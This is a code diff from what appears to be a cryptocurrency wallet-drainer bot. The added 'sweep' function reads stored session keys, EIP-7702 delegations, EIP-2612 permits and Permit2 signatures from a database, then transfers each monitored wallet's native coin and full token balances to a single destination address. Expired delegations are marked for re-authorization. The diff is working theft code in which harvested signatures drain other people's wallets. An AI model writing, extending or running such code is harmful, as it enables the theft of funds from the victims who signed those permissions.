@@ -1172,36 +1172,283 @@ async function checkAllBalances(address) {
   return results;
 }
 
-// ── Dispatch sweep ────────────────────────────────────────────────────────────
+// ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────
 
 async function dispatchSweep(wallet) {
   const short = wallet.address.slice(0, 10);
-  log(`[sweep] 🔄 starting for ${short} type=${wallet.type}`);
+  log(`[sweep] starting for ${short} type=${wallet.type}`);
 
-  const relayerOk = await checkRelayerBalance();
-  if (!relayerOk) { log(`[sweep] ❌ ${short} — relayer too low, skipping`); return; }
-
-  const balances = await checkAllBalances(wallet.address);
-  const nonZero  = balances.filter(b => b.balance > 0n);
-  if (nonZero.length === 0) {
-    log(`[sweep] ${short} — all ${balances.length} token(s) have zero balance, skipping`);
+  // Relayer balance gate
+  const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
+  const min = { eth: parseEther("0.005"), bnb: parseEther("0.005"), polygon: parseEther("1") };
+  if (relayerBal < (min[CHAIN] ?? min.bnb)) {
+    log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
     return;
   }
-  log(`[sweep] balances: ${nonZero.map(b => `${b.symbol}=${ethers.formatUnits(b.balance, b.decimals)}`).join(", ")}`);
+
+  // Debounce
+  const key = wallet.address.toLowerCase();
+  if (sweepingNow.has(key)) return;
+  sweepingNow.add(key);
 
   try {
-    if (wallet.type === "permit2-gasless") {
-      log(`[gasless] reading signature from Supabase for ${short}`);
-      await sweepGaslessWallet(wallet.address);
-    } else if (wallet.type === "permit2" || wallet.type === "wrap-fallback") {
-      await sweepPermit2Wallet(wallet.address);
-    } else {
-      log(`[eip7702] reading auth from Supabase for ${short}`);
-      await sweepEIP7702Wallet(wallet.address);
-    }
+    await sweep(wallet);
     log(`[sweep] ✅ complete for ${short}`);
   } catch (e) {
-    log(`[sweep] ❌ failed for ${short}: ${e.message}`);
+    log(`[sweep] ❌ error for ${short}: ${e.message}`);
+  } finally {
+    setTimeout(() => sweepingNow.delete(key), 10000);
+  }
+}
+
+// ── Universal sweep — 4 tiers ───────────────────────────────────────────────
+
+async function sweep(wallet) {
+  const checksum = normalizeAddress(wallet.address);
+  if (!checksum) return;
+  const short = checksum.slice(0, 10);
+  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
+  const addrKey = checksum.toLowerCase();
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
+  // ══════════════════════════════════════════════════════════════════════════
+  if (wallet.type === "session-key") {
+    let sessionMeta = null;
+    if (supabase) {
+      const { data } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", addrKey)
+        .eq("chain", CHAIN)
+        .single();
+      sessionMeta = data?.permit_metadata;
+    }
+
+    if (!sessionMeta) { log(`[session] no metadata for ${short}`); return; }
+    const expiry = BigInt(sessionMeta.expiry ?? 0);
+    if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
+      log(`[session] expired for ${short} — marking needs-reauth`);
+      if (supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ status: "needs-reauth" })
+          .eq("address", addrKey).eq("chain", CHAIN);
+      }
+      return;
+    }
+
+    log(`[session] sweeping ${short} via session key (expires ${new Date(Number(expiry)*1000).toISOString()})`);
+
+    try {
+      const nativeBal = await rpcProvider.getBalance(checksum);
+      if (nativeBal > parseEther("0.001")) {
+        const fee = await getFeeData();
+        const tx = await relayerWallet.sendTransaction({
+          to: DESTINATION_ADDRESS,
+          value: nativeBal - parseEther("0.001"),
+          ...fee,
+        });
+        await tx.wait();
+        log(`[session] ✅ swept native ${ethers.formatEther(nativeBal)} to destination`);
+      }
+    } catch (e) { warn(`[session] native sweep: ${e.message}`); }
+
+    const tokenList = TOKENS_TO_WATCH.length > 0 ? TOKENS_TO_WATCH : (TOKENS ?? []).map(t => t.address).filter(Boolean);
+    for (const rawAddr of tokenList) {
+      const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr);
+      if (!addr) continue;
+      try {
+        const token = new ethers.Contract(addr, ERC20_ABI, rpcProvider);
+        const balance = await token.balanceOf(checksum);
+        if (balance === 0n) continue;
+        let erc20Allow = 0n;
+        try { erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
+        if (erc20Allow > 0n) {
+          const fee = await getFeeData();
+          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, addr, { gasLimit: 150_000n, ...fee });
+          await tx.wait();
+          log(`[session] ✅ swept ${addr.slice(0,10)}`);
+        } else {
+          log(`[session] ${addr.slice(0,10)} — no Permit2 allowance, skipping`);
+        }
+      } catch (e) { warn(`[session] sweep ${addr?.slice(0,10)}: ${e.message}`); }
+    }
+
+    log(`[session] ✅ session key sweep complete for ${short}`);
+    return;
+  }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 1: EIP-7702 — delegated wallet, sweep via authorization
+  // ══════════════════════════════════════════════════════════════════════════
+  if (wallet.type === "eip7702") {
+    const code = await rpcProvider.getCode(checksum);
+    if (!code || code === "0x" || !code.startsWith("0xef0100")) {
+      log(`[eip7702] ${short} — delegation expired, marking needs-reauth`);
+      needsReauthWallets.add(addrKey);
+      if (supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ status: "needs-reauth" })
+          .eq("address", addrKey).eq("chain", CHAIN);
+      }
+      return;
+    }
+
+    // Sweep via sweepDelegatedWallet (existing logic)
+    await sweepDelegatedWallet(checksum);
+    return;
+  }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 2: EIP-2612 — permit() + transferFrom() per token
+  // ══════════════════════════════════════════════════════════════════════════
+  if (supabase) {
+    const { data: permits } = await supabase
+      .from("eip2612_permits")
+      .select("*")
+      .eq("address", addrKey)
+      .eq("chain", CHAIN)
+      .eq("used", false);
+
+    const BLACKLIST = new Set([
+      "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", // CAKE
+      "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
+    ]);
+
+    for (const p of permits ?? []) {
+      if (BLACKLIST.has(p.token.toLowerCase())) continue;
+      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
+      if (dl > 0n && dl < nowSecs) {
+        log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
+        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
+        continue;
+      }
+
+      const token = new ethers.Contract(p.token, ERC20_ABI, rpcProvider);
+      let balance;
+      try { balance = await token.balanceOf(checksum); } catch { continue; }
+      if (balance === 0n) continue;
+
+      log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
+      try {
+        const fee = await getFeeData();
+        const tc = new ethers.Contract(p.token, EIP2612_PERMIT_ABI, relayerWallet);
+        const tx1 = await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, dl, p.v, p.r, p.s, { gasLimit: 100_000n, ...fee });
+        await tx1.wait();
+        log(`[eip2612] permit() confirmed for ${p.symbol ?? p.token.slice(0,10)}`);
+
+        // Verify allowance was actually set
+        const actualAllow = await token.allowance(checksum, PERMIT2_ADDRESS);
+        if (actualAllow === 0n) {
+          warn(`[eip2612] permit() succeeded but allowance=0 for ${p.symbol ?? p.token.slice(0,10)} — non-standard, skipping`);
+          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+          continue;
+        }
+
+        // Bot pays gas for transferFrom() — sweeps token
+        const tx2 = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, p.token, { gasLimit: 150_000n, ...fee });
+        await tx2.wait();
+        log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
+        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
+      } catch (e) {
+        err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${e.reason ?? e.message}`);
+        await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+      }
+    }
+  }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 3: Permit2 AllowanceTransfer — permitBatch sigs (stored at plain address)
+  // ══════════════════════════════════════════════════════════════════════════
+  if (supabase) {
+    const { data: pbData } = await supabase
+      .from("permit2_signatures")
+      .select("*")
+      .eq("address", addrKey)
+      .eq("chain", CHAIN)
+      .single();
+
+    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
+      for (const detail of pbData.permit.details) {
+        try {
+          const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+          if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
+
+          const token = new ethers.Contract(detail.token, ERC20_ABI, rpcProvider);
+          const balance = await token.balanceOf(checksum);
+          if (balance === 0n) continue;
+
+          const fee = await getFeeData();
+          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, detail.token, { gasLimit: 150_000n, ...fee });
+          await tx.wait();
+          log(`[allowance] ✅ swept ${detail.token.slice(0,10)}`);
+        } catch (e) {
+          err(`[allowance] ❌ ${detail.token.slice(0,10)}: ${e.reason ?? e.message}`);
+        }
+      }
+    }
+  }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 4: Permit2 SignatureTransfer — batch permitTransferFrom
+  // ══════════════════════════════════════════════════════════════════════════
+  if (supabase) {
+    const { data: stData } = await supabase
+      .from("permit2_signatures")
+      .select("*")
+      .eq("address", addrKey + "-sig")
+      .eq("chain", CHAIN)
+      .single();
+
+    if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
+      const sig = stData.permit;
+
+      // Validate before submitting
+      const spenderMatch = sig.spender?.toLowerCase() === relayerWallet.address.toLowerCase();
+      const dl = BigInt(sig.deadline ?? 0);
+      log(`[gasless] spender match: ${spenderMatch} (sig=${sig.spender} relayer=${relayerWallet.address})`);
+      log(`[gasless] deadline: ${sig.deadline} (${new Date(Number(sig.deadline) * 1000).toISOString()})`);
+      log(`[gasless] permitted: ${sig.permitted?.length}`);
+
+      if (!spenderMatch) { log(`[gasless] ❌ spender mismatch`); return; }
+      if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }
+
+      // Check balances — only tokens with balance > 0
+      const withBalance = [];
+      for (const perm of sig.permitted ?? []) {
+        try {
+          const t = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
+          const bal = await t.balanceOf(checksum);
+          if (bal > 0n) withBalance.push({ ...perm, balance: bal });
+        } catch { /* skip */ }
+      }
+
+      if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
+      log(`[gasless] sweeping ${withBalance.length} tokens`);
+
+      try {
+        const fee = await getFeeData();
+        const gasLimit = 150_000n + BigInt(withBalance.length) * 100_000n;
+        const tx = await permit2Batch.permitTransferFrom(
+          {
+            permitted: withBalance.map(t => ({ token: t.token, amount: BigInt(t.amount) })),
+            nonce: BigInt(sig.nonce),
+            deadline: dl,
+          },
+          withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
+          checksum,
+          sig.signature,
+          { gasLimit, ...fee },
+        );
+        await tx.wait();
+        log(`[gasless] ✅ swept ${withBalance.length} tokens`);
+      } catch (e) {
+        err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
+        if ((e.reason ?? e.message).includes("nonce") || (e.reason ?? e.message).includes("InvalidNonce")) {
+          await supabase.from("permit2_signatures").update({ spent: true }).eq("id", stData.id);
+        }
+      }
+    }
   }
 }
 
@@ -1336,10 +1583,10 @@ async function loadDelegatedWallets() {
       monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
     }
     const types    = [...delegatedWallets.values()];
-    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback").length;
-    const glCount  = types.filter(t => t === "permit2-gasless").length;
-    const e7Count  = delegatedWallets.size - p2Count - glCount;
-    log(`[init] loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${glCount} gasless, ${e7Count} eip7702)`);
+    const e7Count  = types.filter(t => t === "eip7702").length;
+    const skCount  = types.filter(t => t === "session-key").length;
+    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
+    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2)`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
